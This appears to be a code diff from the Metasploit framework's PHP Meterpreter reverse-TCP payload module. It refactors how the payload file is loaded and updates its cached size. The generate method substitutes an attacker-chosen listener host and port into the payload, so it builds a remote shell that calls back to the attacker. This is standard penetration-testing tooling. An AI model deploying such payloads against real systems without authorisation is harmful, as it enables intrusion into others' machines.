@@ -12,7 +12,7 @@ require 'msf/base/sessions/meterpreter_options'
 
 module Metasploit4
 
-  CachedSize = 25679
+  CachedSize = 26203
 
   include Msf::Payload::Single
   include Msf::Payload::Php::ReverseTcp
@@ -31,10 +31,7 @@ module Metasploit4
   end
 
   def generate
-    file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
-    met = File.open(file, "rb") {|f|
-      f.read(f.stat.size)
-    }
+    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
 
     met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
